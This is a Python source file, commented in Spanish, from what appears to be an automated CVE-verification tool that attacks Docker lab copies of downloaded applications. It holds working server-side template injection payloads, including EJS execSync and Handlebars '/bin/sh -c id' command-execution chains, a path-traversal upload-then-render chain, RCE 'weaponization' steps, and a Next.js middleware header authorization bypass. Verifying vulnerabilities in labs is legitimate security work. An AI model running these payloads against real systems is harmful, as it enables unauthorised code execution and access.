                sample_params[xss_param] = attempts[0] if attempts else ""
                sample_resp = _http_request(m, base_url + endpoint,
                                            data=sample_params if m != "GET" else None,
                                            params=sample_params if m == "GET" else None, timeout=15)
                res.evidence["respuesta_cuerpo_recorte"] = (getattr(sample_resp, "text", "") or "")[:500]
            except Exception:
                pass
        res.evidence["intentos"] = tried[:50]
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        if lab is not None:
            lab.teardown()


def verify_generic_ssti(
    source_dir: str, endpoint: str, http_method: str, parameters,
    ssti_param_hint: str = "", on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0, custom_headers: Optional[dict] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    setup_commands: Optional[List[str]] = None,
) -> WpVerifyResult:
    """Analogo generico de verify_wordpress_ssti: el payload pide al motor de plantillas que
    CALCULE una operacion aritmetica con dos numeros aleatorios; si el resultado (que no aparece
    en ningun punto del payload enviado) sale en la respuesta, es prueba de que el motor EVALUO
    codigo, no que lo reflejo como texto. Incluye las plantillas elegidas a mano MAS todas las
    generalizables de ssti.fuzz en PayloadsAllTheThings.

    Comportamiento de descubrimiento autonomo: antes de usar el endpoint que propuso el LLM,
    escanea el codigo fuente en source_dir buscando rutas Flask/Sinatra reales (@app.route,
    request.args.get). Las rutas descubiertas se prueban primero; solo si fallan se recurre
    al endpoint del LLM. Esto elimina la dependencia de que el LLM adivine el endpoint exacto
    a partir de la descripcion NVD (que no lo menciona).
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    # --- Descubrimiento autonomo de rutas desde el codigo fuente ---
    scanned = _scan_web_routes(source_dir) if source_dir else []
    if scanned:
        step(f"escaneo de fuente: {len(scanned)} ruta(s) encontrada(s): " +
             ", ".join(ep for ep, _, _ in scanned))

    _params_list_ssti = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters or [])
    ssti_param = ssti_param_hint or _pick_param(parameters, _XSS_HINTS) or (_params_list_ssti[0] if _params_list_ssti else "")
    _analyst_owns_lab = False  # only path-traversal skips scan; SSTI always uses scan

    # Si el LLM no identifico parametro pero el escaneo si, usar la primera ruta con parametro
    if not ssti_param and scanned:
        for s_ep, s_params, s_meth in scanned:
            s_p = _pick_param(s_params, _XSS_HINTS) or (list(s_params.keys())[0] if s_params else "")
            if s_p:
                endpoint, parameters, http_method, ssti_param = s_ep, s_params, s_meth, s_p
                step(f"escaneo de fuente: parametro no identificado por LLM -- usando ruta "
                     f"descubierta: {s_ep} param={s_p}")
                break

    if not ssti_param:
        res.detail = "no se identifico el parametro que llega al motor de plantillas"
        res.limitations.append("la verificacion de SSTI necesita saber que parametro llega a la "
                               "plantilla; afina 'parameters' o pasalo a mano (ssti_param_hint)")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files,
                                   setup_commands=setup_commands)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        a, b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
        expected = a * b

        # Baseline probe: check if expected product already appears in a static response
        # (e.g., the product 144 could be a port or constant in the page).
        # Roll operands up to 3 times to avoid baseline collision.
        _ep_for_baseline = (endpoint or "/").split("?")[0]
        for _retry_ssti in range(3):
            try:
                _base_r = _http_request(
                    (http_method or "GET").upper().split("/")[0].strip() or "GET",
                    base_url + _ep_for_baseline, timeout=8,
                )
                _baseline_text = (_base_r.text or "") if _base_r else ""
            except Exception:
                _baseline_text = ""
            _pat_ssti = re.compile(rf"(?<!\d){expected}(?!\d)")
            if not _pat_ssti.search(_baseline_text):
                break
            a, b = secrets.randbelow(90) + 10, secrets.randbelow(90) + 10
            expected = a * b
            if _retry_ssti < 2:
                step(f"SSTI: baseline ya contiene {expected} — re-generando operandos ({_retry_ssti+1}/3)")

        mul = f"{a}*{b}"
        hand_made = [
            f"{{{{{mul}}}}}", f"${{{mul}}}", f"#{{{mul}}}", f"<%= {mul} %>",
            f"{{{mul}}}", f"${{{{{mul}}}}}", f"<#if true>${{{mul}}}</#if>",
            f"}}{{{mul}}}{{", f"'}}{{{mul}}}{{'", f'"}}{{{mul}}}{{"',
            f"-}}{{{mul}}}{{-", f"\">{{{{{mul}}}}}<\"",
        ]

        # Engine-specific payload prioritization: detect template engine from source
        # and prepend its characteristic payloads so they run first.
        _engine_key = "generic"
        _hint_text = " ".join([
            (source_dir or ""),
            str(setup_commands or ""),
            str(dockerfile_body or ""),
        ]).lower()
        if any(x in _hint_text for x in ("jinja", "flask", "django", "mako")):
            _engine_key = "jinja2"
        elif any(x in _hint_text for x in ("twig", "laravel", "symfony")):
            _engine_key = "twig"
        elif any(x in _hint_text for x in ("freemarker", "ftl")):
            _engine_key = "freemarker"
        elif any(x in _hint_text for x in ("pebble",)):
            _engine_key = "pebble"
        elif any(x in _hint_text for x in ("smarty",)):
            _engine_key = "smarty"
        elif any(x in _hint_text for x in ("erb", "rails", "sinatra")):
            _engine_key = "erb"
        elif any(x in _hint_text for x in ("ejs",)):
            _engine_key = "ejs"
        elif any(x in _hint_text for x in ("pug", "jade")):
            _engine_key = "pug"
        elif any(x in _hint_text for x in ("handlebars", "hbs", "mustache")):
            _engine_key = "handlebars"
        _ENGINE_FRONT_PAYLOADS = {
            "jinja2":     [f"{{{{{mul}}}}}", "{{config}}", "{{''.__class__}}", f"${{{mul}}}"],
            "twig":       [f"{{{{{mul}}}}}", f"{{% set x = {mul} %}}{{{{x}}}}", f"{{{{ {mul} }}}}"],
            "freemarker": [f"${{{mul}}}", f"${{({mul})?int}}", f"<#assign x={mul}>${{x}}"],
            "pebble":     [f"{{{{{mul}}}}}", f"{{% set x = {mul} %}}{{{{x}}}}"],
            "smarty":     [f"{{{{{mul}}}}}", f"{{math equation=\"{mul}\"}}"],
            "erb":        [f"<%= {mul} %>", f"#{{({mul})}}", f"<%={mul}%>"],
            "ejs":        [f"<%={mul}%>", f"<%-{mul}%>", f"<%= {mul} %>",
                           "<%- global.process.mainModule.require('child_process')"
                           ".execSync('id').toString() %>"],
            "pug":        ["#{7*7}", f"-var x = {mul};\n=x", f"= {mul}"],
            "handlebars": [f"{{{{{mul}}}}}", "{{7*7}}",
                           "{{#with 'con'structo'r'}}{{#with split as |a|}}"
                           "{{#with (lookup a '0')}}{{#with (lookup . 'apply')}}"
                           "{{this '7' '7' (lookup (lookup . 'proto') 'exec') '/bin/sh' '-c' 'id'}}"
                           "{{/with}}{{/with}}{{/with}}{{/with}}"],
            "generic":    [],
        }
        _front = _ENGINE_FRONT_PAYLOADS.get(_engine_key, [])
        if _front and _engine_key != "generic":
            step(f"SSTI: engine detected={_engine_key!r}, prepending {len(_front)} engine-specific payloads")
        # Deduplicate: engine payloads first, then generic (without duplicates)
        _hand_set = set(hand_made)
        _extra_front = [(p, expected) for p in _front if p not in _hand_set]
        attempt_pairs = _extra_front + [(p, expected) for p in hand_made] + load_ssti_arithmetic_payloads(a, b)

        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"

        # Construir lista ordenada de candidatos: rutas del escaneo primero, luego LLM
        candidates: list = []
        seen_cands: set = set()
        for s_ep, s_params, s_meth in scanned:
            s_p = _pick_param(s_params, _XSS_HINTS) or (list(s_params.keys())[0] if s_params else "")
            if s_p:
                key = (s_ep, s_p, s_meth.upper())
                if key not in seen_cands:
                    seen_cands.add(key)
                    candidates.append((s_ep, s_params, s_meth.upper(), s_p, True))
        # Endpoint del LLM como fallback si no es igual a uno ya escaneado
        llm_key = (endpoint, ssti_param, m)
        if endpoint and llm_key not in seen_cands:
            candidates.append((endpoint, parameters, m, ssti_param, False))
        if not candidates:
            candidates.append((endpoint or "/", parameters, m, ssti_param, False))

        found = False
        tried_all: list = []
        win_ep = endpoint or "/"
        win_param = ssti_param
        _ssti_waf = _WafGuard()

        for cand_ep, cand_params, cand_meth, cand_p, from_scan in candidates:
            if found or _ssti_waf.is_blocked:
                break
            if from_scan:
                step(f"escaneo de fuente: probando ruta descubierta: {cand_ep} param={cand_p}")
            ep_path = cand_ep.split("?")[0] if cand_ep and "?" in cand_ep else (cand_ep or "/")
            tried: list = []
            for payload_value, payload_expected in attempt_pairs:
                if found or _ssti_waf.is_blocked:
                    break
                pattern = re.compile(rf"(?<!\d){payload_expected}(?!\d)")
                payload = dict(cand_params) if isinstance(cand_params, dict) else dict.fromkeys(cand_params or [], "")
                payload[cand_p] = payload_value
                try:
                    resp = _http_request(cand_meth, base_url + ep_path, timeout=15,
                                         data=payload if cand_meth != "GET" else None,
                                         params=payload if cand_meth == "GET" else None,
                                         headers=custom_headers or None)
                    if _ssti_waf.check(resp, step):
                        break
                except Exception as e:
                    tried.append({"payload": payload_value, "error": str(e)})
                    continue
                _resp_text = resp.text or ""
                matched = bool(pattern.search(_resp_text))
                # For RCE-class SSTI payloads (EJS execSync, Handlebars), also check uid= output
                if not matched and "uid=" in _resp_text and "execSync" in payload_value:
                    matched = True
                    res.evidence["ssti_rce_signal"] = "uid= found in response from execSync payload"
                tried.append({"payload": payload_value, "status": resp.status_code,
                              "resultado_presente": matched})
                if matched:
                    found = True
                    win_ep, win_param = cand_ep, cand_p
                    res.evidence["payload_ganador"] = payload_value
                    res.evidence["resultado_esperado_ganador"] = payload_expected
                    res.evidence["respuesta_cuerpo_recorte"] = _resp_text[:500]
                    step(f"VERIFICADO: la respuesta contiene {payload_expected}, calculado por el "
                         f"motor de plantillas -- ese numero no aparece en el payload enviado.")
                    _ssti_url = base_url + ep_path
                    _add_exploit_evidence(
                        res=res, method=cand_meth, url=_ssti_url,
                        resp_or_body=resp, highlight=str(payload_expected),
                        caption_es=(f"SSTI CONFIRMADA: '{cand_p}'={payload_value!r} — "
                                    f"motor evaluo expresion y devolvio {payload_expected} "
                                    f"(no estaba en el payload enviado)."),
                        caption_en=(f"SSTI CONFIRMED: '{cand_p}'={payload_value!r} — "
                                    f"engine evaluated expression and returned {payload_expected} "
                                    f"(not in the sent payload)."),
                    )
                    step("captura HTTP guardada en el informe.")
                    break
            tried_all.extend(tried)
            if found:
                break

        # --- JSON body injection for SSTI (API endpoints that only accept Content-Type: application/json) ---
        if not found and m != "GET":
            step("SSTI: probando inyeccion via JSON body (API endpoints con Content-Type: application/json)...")
            _json_cands = [(win_param or ssti_param, cand_params)]
            if not (win_param or ssti_param) and parameters:
                _pnames = list(parameters.keys()) if isinstance(parameters, dict) else list(parameters)
                _json_cands = [(_pn, parameters) for _pn in _pnames[:3]]
            for _jp, _jp_params in _json_cands:
                if not _jp:
                    continue
                for payload_value, payload_expected in attempt_pairs[:6]:
                    pattern = re.compile(rf"(?<!\d){payload_expected}(?!\d)")
                    _jbody = dict(_jp_params) if isinstance(_jp_params, dict) else {}
                    _jbody[_jp] = payload_value
                    try:
                        resp = _http_request(m, base_url + (win_ep or endpoint or "/"),
                                             timeout=15,
                                             json=_jbody,
                                             headers={"Content-Type": "application/json",
                                                      **(custom_headers or {})})
                        matched = bool(pattern.search(resp.text or ""))
                        if matched:
                            found = True
                            win_param = _jp
                            res.evidence["payload_ganador"] = payload_value
                            res.evidence["resultado_esperado_ganador"] = payload_expected
                            res.evidence["respuesta_cuerpo_recorte"] = (resp.text or "")[:500]
                            res.evidence["tecnica"] = "ssti-json-body"
                            step(f"SSTI JSON body VERIFICADO: '{_jp}'={payload_value!r} → {payload_expected}")
                            _add_exploit_evidence(
                                res=res, method=m, url=base_url + (win_ep or endpoint or "/"),
                                resp_or_body=resp, highlight=str(payload_expected),
                                caption_es=f"SSTI via JSON body CONFIRMADA: '{_jp}'={payload_value!r} → {payload_expected}",
                                caption_en=f"SSTI via JSON body CONFIRMED: '{_jp}'={payload_value!r} → {payload_expected}",
                            )
                            break
                    except Exception:
                        pass
                if found:
                    break

        # --- Multi-step SSTI: upload-then-render (e.g. CVE-2026-27641 flask-reuploaded) --------
        # Algunos ataques SSTI requieren dos peticiones: (1) subir un fichero que contiene
        # sintaxis de plantilla a traves de un endpoint de subida con path traversal, (2) rendir
        # ese fichero desde un endpoint de renderizado. El verificador simple (una sola peticion)
        # no los cubre. Detectamos el patron buscando en las rutas escaneadas:
        #   - Un endpoint de SUBIDA: POST con params que incluyan 'name' o 'filename' (upload).
        #   - Un endpoint de RENDERIZADO: GET con __RENDERS_TEMPLATE__ en sus params.
        # Si ambos existen, intentamos la cadena upload -> render.
        if not found:
            _upload_eps = [(ep, ps, me) for ep, ps, me in scanned
                          if me == "POST" and any(k in ("name", "filename", "file", "path")
                                                  for k in (ps or {}))]
            _render_eps = [(ep, ps, me) for ep, ps, me in scanned
                           if me == "GET" and isinstance(ps, dict)
                           and ps.get("__RENDERS_TEMPLATE__")]
            if _upload_eps and _render_eps:
                step("intentando SSTI multi-step: upload traversal -> render...")
                import io as _io
                _ssti_payloads_ms = [
                    "{{" + str(a) + "*" + str(b) + "}}",
                    "${" + str(a) + "*" + str(b) + "}",
                    "#{" + str(a) + "*" + str(b) + "}",
                ]
                for _up_ep, _up_ps, _up_me in _upload_eps:
                    if found:
                        break
                    for _ssti_pl in _ssti_payloads_ms:
                        if found:
                            break
                        _tpl_name = f"binoracle_ssti_{_token()}.html"
                        _tpl_content = f"<!-- binoracle test -->{_ssti_pl}"
                        # Build a traversal name that writes to templates/ (or similar)
                        # Common patterns: ../templates/<name>, ../../templates/<name>
                        _name_candidates = [
                            f"../templates/{_tpl_name}",
                            f"../../templates/{_tpl_name}",
                            f"../views/{_tpl_name}",
                        ]
                        for _nc in _name_candidates:
                            if found:
                                break
                            try:
                                _file_obj = _io.BytesIO(_tpl_content.encode())
                                _up_url = base_url + _up_ep
                                _up_params = dict(_up_ps) if isinstance(_up_ps, dict) else {}
                                _up_params.pop("__RENDERS_TEMPLATE__", None)
                                # Set traversal name in the name/filename param
                                for _np in ("name", "filename", "file", "path"):
                                    if _np in _up_params:
                                        _up_params[_np] = _nc
                                        break
                                else:
                                    _up_params["name"] = _nc
                                _up_resp = _http_request(
                                    "POST", _up_url, timeout=15, params=_up_params,
                                    files={"file": (_tpl_name, _file_obj, "text/html")})
                                if _up_resp.status_code not in (200, 201, 204):
                                    continue
                                # Try rendering -- strip Flask path variables like <path:var>
                                for _rend_ep, _rend_ps, _rend_me in _render_eps:
                                    _rend_base = re.sub(r'/<[^>]+>', '', _rend_ep)
                                    _rend_url = base_url + _rend_base.rstrip("/") + "/" + _tpl_name
                                    _rend_resp = _http_request("GET", _rend_url, timeout=15)
                                    if str(expected) in (_rend_resp.text or ""):
                                        found = True
                                        win_ep, win_param = _rend_ep, "URL_PATH"
                                        res.evidence["payload_ganador"] = _ssti_pl
                                        res.evidence["upload_name_ganador"] = _nc
                                        res.evidence["render_url_ganador"] = _rend_url
                                        res.evidence["resultado_esperado_ganador"] = str(expected)
                                        res.evidence["respuesta_cuerpo_recorte"] = (
                                            _rend_resp.text or "")[:500]
                                        step(f"VERIFICADO (multi-step): upload {_nc!r} + render "
                                             f"{_rend_url!r} devolvio {expected}.")
                                        _add_exploit_evidence(
                                            res=res, method="GET", url=_rend_url,
                                            resp_or_body=_rend_resp, highlight=str(expected),
                                            caption_es=(f"SSTI multi-step CONFIRMADA: upload "
                                                        f"'{_nc}' + render devolvio {expected} "
                                                        f"— motor evaluo '{_ssti_pl}'."),
                                            caption_en=(f"Multi-step SSTI CONFIRMED: upload "
                                                        f"'{_nc}' + render returned {expected} "
                                                        f"— engine evaluated '{_ssti_pl}'."),
                                        )
                                        break
                            except Exception:
                                pass
        # ------------------------------------------------------------------------------------

        # Strip query string from endpoint - params are always sent via params= dict separately;
        # duplicate query params (from both the endpoint path and params=) would make Flask/Django
        # use the placeholder literal instead of the payload.
        res.evidence.update({"base_url": base_url, "contenedor": container, "endpoint": win_ep,
                             "metodo": m, "ssti_param": win_param, "a": a, "b": b,
                             "producto_esperado": expected})
        res.evidence["intentos"] = tried_all
        if found:
            res.verified = True
            res.ok = True

            # Phase 2: RCE escalation via payload_kb SSTI RCE payloads
            # Attempt after arithmetic confirmation so we have the confirmed param/endpoint
            try:
                from .payload_kb import load_ssti_rce_payloads as _lsrp
                _rce_payloads = _lsrp("id")
                _rce_ep = win_ep or endpoint or "/"
                _rce_ep_path = _rce_ep.split("?")[0]
                step(f"SSTI Phase 2: escalacion RCE con {len(_rce_payloads)} payloads (param={win_param!r})")
                for _engine_lbl, _rce_pl in _rce_payloads[:8]:  # limit to first 8 for speed
                    _rce_send_params = {win_param: _rce_pl}
                    try:
                        if m == "GET":
                            _rce_resp = _http_request(m, base_url + _rce_ep_path,
                                                      params=_rce_send_params,
                                                      headers=custom_headers or {}, timeout=15)
                        else:
                            _rce_resp = _http_request(m, base_url + _rce_ep_path,
                                                      data=_rce_send_params,
                                                      headers=custom_headers or {}, timeout=15)
                        _rce_body = _rce_resp.text or ""
                        _uid_m = __import__("re").search(r'uid=\d+\([^)]+\)', _rce_body)
                        if _uid_m:
                            step(f"SSTI RCE CONFIRMADO via {_engine_lbl}: {_uid_m.group(0)!r}")
                            res.evidence["ssti_rce"] = {
                                "technique": _engine_lbl,
                                "payload": _rce_pl,
                                "id_output": _uid_m.group(0),
                            }
                            res.evidence["ssti_rce_id_output"] = _uid_m.group(0)
                            res.evidence["ssti_engine"] = _engine_lbl.split("_")[0]
                            break
                    except Exception:
                        pass
            except Exception:
                pass

            # Weaponization: try RCE via the confirmed SSTI vector
            try:
                _ssti_wep = _try_weaponize_generic(
                    base_url=base_url,
                    endpoint=win_ep or endpoint or "/",
                    method=m,
                    query_params={win_param: ""} if m == "GET" else None,
                    post_data={win_param: ""} if m != "GET" else None,
                    hdrs=custom_headers or {},
                    confirm_string="",
                    vuln_class="ssti",
                    step=step,
                )
                if _ssti_wep.get("impact"):
                    res.evidence["weaponization"] = _ssti_wep
            except Exception:
                pass
            if res.evidence.get("upload_name_ganador"):
                res.detail = (
                    f"SSTI multi-step confirmada: upload con name={res.evidence['upload_name_ganador']!r} "
                    f"(payload: {res.evidence['payload_ganador']!r}) + render en "
                    f"{res.evidence.get('render_url_ganador', win_ep)!r} devolvio {expected} -- "
                    f"el motor de plantillas EVALUO la plantilla subida por path traversal")
            else:
                res.detail = (f"SSTI confirmada: la peticion con {win_param}="
                              f"{res.evidence['payload_ganador']!r} hizo que el motor de plantillas "
                              f"EVALUARA la expresion y devolviera "
                              f"{res.evidence['resultado_esperado_ganador']} en la respuesta -- "
                              f"prueba inequivoca de evaluacion de codigo en servidor")
        else:
            res.ok = True
            res.detail = (f"se probaron {len(tried_all)} sintaxis de plantilla para {win_param} "
                          f"(producto esperado {a}*{b}={expected}, mas las plantillas aditivas) y "
                          f"ninguna produjo el resultado esperado -- el SSTI no se confirmo")
        return res
    except subprocess.TimeoutExpired as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        if lab is not None:
            lab.teardown()


def verify_generic_header_bypass(
    source_dir: str, endpoint: str, http_method: str,
    bypass_header: str, bypass_value: str,
    confirm_string: str = "",
    on_step: Optional[Callable[[str], None]] = None,
    budget_s: float = 900.0,
    bypass_url: Optional[str] = None,
    dockerfile_body: str = "", extra_files: Optional[dict] = None,
    pkg_version: str = "",
    vuln_class: str = "",
    setup_commands: Optional[List[str]] = None,
    docker_image: str = "",
) -> WpVerifyResult:
    """Verifica un bypass de autorizacion via CABECERA HTTP o URL manipulada.

    Mecanismo:
    1) Levanta el lab efimero con el Dockerfile/compose del codigo descargado.
    2) Envia la peticion SIN bypass al endpoint original: espera 3xx/401/403 (bloqueado).
    3a) Si bypass_header+bypass_value: envia la misma peticion CON la cabecera de bypass.
    3b) Si bypass_url: envia peticion a la URL manipulada SIN cabecera extra (ej. path
        confusion: /api/v1/feeds;a=../../users en CVE-2024-28255 OpenMetadata).
    Si el servidor responde 2xx y el cuerpo contiene `confirm_string`, VERIFICADO.

    `bypass_header`: nombre de la cabecera maliciosa (p.ej. "x-middleware-subrequest").
    `bypass_value`: valor exacto de la cabecera (p.ej. "middleware:middleware:...").
    `bypass_url`: URL manipulada alternativa (path confusion/semicolon bypass); si se
                  proporciona, se ignoran bypass_header/bypass_value en el intento de bypass.
    `confirm_string`: cadena que debe aparecer en la respuesta con bypass para confirmar
                      acceso real (vacia = solo se comprueba que el status sea 2xx).
    """
    step = on_step or (lambda _m: None)
    res = WpVerifyResult()
    if not _docker_daemon_ok():
        res.available = False
        res.detail = "sin daemon Docker alcanzable"
        res.limitations.append("verificacion dinamica NO intentada: sin daemon Docker")
        return res

    if not bypass_url and (not bypass_header or not bypass_value):
        res.detail = "se necesita bypass_header+bypass_value o bypass_url para la verificacion"
        res.limitations.append("la verificacion de header bypass necesita el nombre y valor "
                               "exactos de la cabecera maliciosa, o una bypass_url alternativa")
        return res

    boot = _bootstrap_generic_lab(source_dir, step, res, budget_s,
                                   dockerfile_body=dockerfile_body, extra_files=extra_files,
                                   pkg_version=pkg_version, setup_commands=setup_commands,
                                   docker_image=docker_image)
    if boot is None:
        return res
    lab, base_url, container = boot
    try:
        m = (http_method or "GET").upper().split("/")[0].split("|")[0].strip() or "GET"
        url = base_url + endpoint
        step(f"probando SIN bypass: {m} {url}")
        body_normal = ""
        try:
            # allow_redirects=False: necesitamos el status REAL del servidor (3xx/401/403),
            # no el de la pagina de login/error a la que redirige -- igual que open_redirect.
            r_normal = _http_request(m, url, timeout=15, allow_redirects=False)
            status_normal = r_normal.status_code
            body_normal = getattr(r_normal, "text", "") or ""
        except Exception as e:
            status_normal = -1
            step(f"error en peticion normal: {e}")

        if bypass_url:
            step(f"probando CON URL manipulada (path confusion): {m} {base_url + bypass_url}")
            try:
                r_bypass = _http_request(m, base_url + bypass_url, timeout=15,
                                         allow_redirects=False)
                status_bypass = r_bypass.status_code
                body_bypass = r_bypass.text or ""
            except Exception as e:
                status_bypass = -1
                body_bypass = ""
                step(f"error en peticion con bypass_url: {e}")
        else:
            step(f"probando CON cabecera '{bypass_header}: {bypass_value}'")
            try:
                r_bypass = _http_request(m, url, timeout=15, allow_redirects=False,
                                         headers={bypass_header: bypass_value})
                status_bypass = r_bypass.status_code
                body_bypass = r_bypass.text or ""
            except Exception as e:
                status_bypass = -1
                body_bypass = ""
                step(f"error en peticion con bypass: {e}")
            # If first bypass_value didn't work, try common alternate formats
            # (e.g. Next.js uses both 'pages/_middleware' and 'middleware:...:middleware' variants)
            if status_bypass not in range(200, 300) and status_normal not in range(200, 300):
                _bv_base = bypass_value.split(":")[0].strip()
                _alt_bypass_values = []
                # 5x-repetition variants for middleware-identity bypass
                for _bv_alt in (
                    "pages/_middleware:pages/_middleware:pages/_middleware:pages/_middleware:pages/_middleware",
                    "middleware:middleware:middleware:middleware:middleware",
                    "src/middleware:src/middleware:src/middleware:src/middleware:src/middleware",
                    "pages/_middleware",
                    "middleware",
                    "src/middleware",
                ):
                    if _bv_alt != bypass_value:
                        _alt_bypass_values.append(_bv_alt)
                for _alt_bv in _alt_bypass_values[:5]:
                    try:
                        _r_alt = _http_request(m, url, timeout=15, allow_redirects=False,
                                               headers={bypass_header: _alt_bv})
                        if _r_alt.status_code in range(200, 300):
                            step(f"  variante '{_alt_bv}' dio {_r_alt.status_code} → usando este valor")
                            status_bypass = _r_alt.status_code
                            body_bypass = _r_alt.text or ""
                            bypass_value = _alt_bv
                            break
                    except Exception:
                        pass

        _bypass_desc = (f"URL manipulada '{bypass_url}'" if bypass_url
                        else f"cabecera '{bypass_header}: {bypass_value}'")
        res.evidence = {
            "base_url": base_url,
            "contenedor": container,
            "endpoint": endpoint,
            "bypass_url": bypass_url or "",
            "metodo": m,
            "bypass_header": bypass_header,
            "bypass_value": bypass_value,
            "status_sin_bypass": status_normal,
            "status_con_bypass": status_bypass,
            "confirm_string": confirm_string,
            "confirm_string_presente": bool(confirm_string and confirm_string in body_bypass),
            "respuesta_cuerpo_recorte": body_bypass[:500],
        }

        blocked_normally = status_normal not in range(200, 300)
        bypassed = status_bypass in range(200, 300)
        # For XSS payloads in confirm_string, also check unescaped reflection
        _xss_reflected = (confirm_string and
                          any(c in confirm_string for c in ("<", "alert(", "onerror")) and
                          _check_xss_reflected(body_bypass, confirm_string))
        string_ok = (not confirm_string) or (confirm_string in body_bypass) or _xss_reflected

        if blocked_normally and bypassed and string_ok:
            res.verified = True
            res.ok = True
            res.confidence = "confirmed"
            res.detail = (
                f"BYPASS confirmado: sin {_bypass_desc} el servidor responde "
                f"{status_normal}; con {_bypass_desc} responde "
                f"{status_bypass}" +
                (f" y el cuerpo contiene '{confirm_string}'" if confirm_string else "") +
                " -- el control de autorizacion fue eludido"
            )
            # Impact escalation: probe what this unprotected access can actually do
            _ESCALATE_CLASSES = {"missing-authorization", "auth-bypass",
                                  "broken-access-control", "idor"}
            if vuln_class and vuln_class.lower().replace(" ", "-") in _ESCALATE_CLASSES:
                _bypass_hdrs = {}
                if bypass_header and bypass_value:
                    _bypass_hdrs[bypass_header] = bypass_value
                _esc = _escalate_missing_auth_impact(
                    base_url, endpoint, _bypass_hdrs, step, budget_s=60.0)
                if _esc:
                    res.evidence["impact_escalation"] = _esc
                    res.detail += f"\n\nImpacto escalado: {_esc['escalation_summary']}"
                    step(f"  escalación: {_esc['impact_class']} / {_esc['max_impact_found']}")
            step("capturando evidencia visual (screenshots del laboratorio)...")
            shots, http_caps = _take_generic_screenshots_bypass(
                base_url, endpoint, m, bypass_header or "bypass_url", bypass_url or bypass_value,
                status_normal, body_normal, status_bypass, body_bypass)
            if shots:
                res.evidence["screenshots"] = shots
            if http_caps:
                res.evidence["http_captures"] = http_caps
        else:
            res.ok = True
            # Diagnostico automatico: razona por que fallo el bypass
            _diag = []
            if status_normal in range(200, 300):
                _diag.append(
                    f"el endpoint responde {status_normal} SIN el bypass -- el middleware "
                    f"no esta bloqueando la ruta; revisa que el middleware cubra '{endpoint}'"
                )
            elif status_normal == -1:
                _diag.append(f"error de red al probar sin bypass -- el servidor no responde en {endpoint}")
            else:
                # Middleware SI bloquea (correcto). Analiza por que el bypass no funciono.
                if status_bypass == status_normal:
                    _diag.append(
                        f"el bypass NO cambio el status ({status_normal} → {status_bypass}) -- "
                        f"el header '{bypass_header}: {bypass_value}' no fue procesado; "
                        f"posibles causas: (1) version del servidor incorrecta para esta CVE, "
                        f"(2) valor del bypass incorrecto (prueba variantes: 'src/middleware', "
                        f"'pages/_middleware', 'middleware:middleware'), "
                        f"(3) el middleware no lee ese header internamente"
                    )
                elif status_bypass in range(200, 300) and confirm_string and not string_ok:
                    _diag.append(
                        f"bypass llego al endpoint (status {status_bypass}) pero confirm_string "
                        f"'{confirm_string}' no aparece en la respuesta -- el lab puede no estar "
                        f"sirviendo el recurso esperado en '{endpoint}'"
                    )
                    # Semantic analysis: even without confirm_string, check if
                    # the response body has interesting exploitability signals
                    _analysis = _analyze_response_body(
                        body_bypass, vuln_class,
                        payload="", confirm_string=confirm_string,
                        status_code=status_bypass,
                    )
                    if _analysis.get("interesting"):
                        res.evidence["response_analysis"] = _analysis
                        _diag.append(
                            f"analisis semantico: {_analysis['partial_confidence']:.0%} confianza "
                            f"— señales: {'; '.join(_analysis['signals'][:3])}"
                        )
                elif status_bypass not in range(200, 300):
                    _diag.append(
                        f"bypass no dio 2xx (status {status_bypass}) -- el servidor sigue "
                        f"bloqueando incluso con el header; prueba variantes del valor del bypass"
                    )
            res.confidence = "inconclusive"
            res.detail = (
                f"header bypass no confirmado: status_sin_bypass={status_normal}, "
                f"status_con_bypass={status_bypass}" +
                (f", confirm_string_presente={string_ok}" if confirm_string else "") +
                (f" -- DIAGNOSTICO: {'; '.join(_diag)}" if _diag else "")
            )
        return res
    except subprocess.TimeoutExpired as e:
        res.confidence = "not_reproducible"
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    except Exception as e:
        res.confidence = "not_reproducible"
        res.detail = _diagnose_infra_error(e, source_dir)
        return res
    finally:
        step("desmontando el laboratorio generico (contenedores/red/imagen)...")
        if lab is not None:
            lab.teardown()


def _analyze_response_body(
    body: str,
    vuln_class: str,
    payload: str = "",
    confirm_string: str = "",
    status_code: int = 0,
) -> dict:
    """Semantic analysis of an HTTP response body for exploitability signals.

    Called when the response arrives but confirm_string is absent or empty.
    Returns a dict:
      partial_confidence: 0.0–0.85 — how confident we are the vuln is present
      signals: list[str] — human-readable signals that raised confidence
      interesting: bool — True when partial_confidence >= 0.30

    Signal categories vary by vuln_class:
      xss/ssti:   raw payload in body, unescaped <script> / alert(, event attrs
      sqli:       SQL error keywords, database banners, row count changes
      rce/cmdi:   command output patterns (uid=, /bin/sh, root:x:0:)
      ssrf:       internal host leakage, cloud metadata patterns
      lfi/traversal: file content patterns (/etc/passwd, root:x:0:)
      missing-auth/idor: private data keywords (password, token, email, secret)
    """
    _body = (body or "")
    _bl = _body.lower()
    _vc = (vuln_class or "").lower().replace(" ", "-")
    signals: list = []
    score = 0.0

    # --- Generic 2xx signal (baseline) ---
    if status_code in range(200, 300) and _body.strip():
        score += 0.05

    # --- XSS / SSTI signals ---
    if _vc in ("xss", "reflected-xss", "stored-xss", "ssti", "template-injection"):
        # Payload appears unescaped
        if payload and payload in _body:
            score += 0.60
            signals.append("payload appears verbatim in body (unescaped)")
        # Script/event handler patterns
        if "<script" in _bl and ("alert" in _bl or "onerror" in _bl):
            score += 0.45
            signals.append("unescaped <script> with alert/onerror found")
